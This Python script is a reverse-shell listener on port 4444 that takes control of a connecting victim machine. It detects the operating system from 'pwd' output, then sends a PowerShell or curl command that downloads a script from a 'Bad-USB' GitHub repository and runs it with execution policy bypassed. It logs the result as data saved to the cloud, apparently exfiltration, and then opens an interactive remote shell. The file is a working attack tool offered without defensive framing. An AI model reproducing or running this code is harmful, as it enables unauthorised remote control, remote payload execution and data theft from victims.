import socket
import time
import select

def recv_all(conn, max_wait=30):
    """Block until data arrives, then collect all available data"""
    data = b""
    conn.setblocking(0)
    
    # Wait for first chunk (up to max_wait seconds)
    start = time.time()
    while time.time() - start < max_wait:
        ready = select.select([conn], [], [], 0.5)
        if ready[0]:
            try:
                chunk = conn.recv(8192)
                if chunk:
                    data += chunk
                    break
            except:
                pass
    
    # Collect any remaining data with short timeout
    while True:
        ready = select.select([conn], [], [], 0.3)
        if ready[0]:
            try:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                data += chunk
            except:
                break
        else:
            break
    
    conn.setblocking(1)
    return data.decode(errors="ignore")

def listener():
    host = "0.0.0.0"
    port = 4444
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    
    print(f"[*] Listening on {host}:{port}")
    
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    print("[*] Detecting OS...")
    # OS Detection using pwd output
    time.sleep(0.5)  # Wait for shell to be ready
    
    conn.send(b"pwd\n")
    response = recv_all(conn, max_wait=10)

    print("Response: ",response)
    if "C:" in response:
        operating_system = "Windows"
        conn.send(b'powershell -command iwr "https://raw.githubusercontent.com/black1hp/Bad-USB/main/firebase.ps1" -UseBasicParsing -OutFile "$env:TEMP\\f.ps1"; powershell -ep bypass -file "$env:TEMP\\f.ps1"\n')
        print("[*] Data Saved on cloud")
    elif "/" in response:
        operating_system = "Linux"
        conn.send(b"curl -sL https://raw.githubusercontent.com/black1hp/Bad-USB/main/firebase.ps1 -o /tmp/f.ps1 && pwsh /tmp/f.ps1 >/dev/null 2>&1\n")
        print("[*] Data Saved on cloud")

    print(f"[+] Current OS: {operating_system}")
    time.sleep(2)
    conn.send(("\n").encode())
    response = recv_all(conn, max_wait=10)
    

    while True:

        cmd = input("Shell> ")
        if cmd.lower() in ["exit", "quit"]:
            conn.send(b"exit\n")
            break
        
        conn.send((cmd + "\n").encode())
        
        response = recv_all(conn, max_wait=30)
        print(response)
    
    conn.close()
    s.close()

if __name__ == "__main__":
    listener()
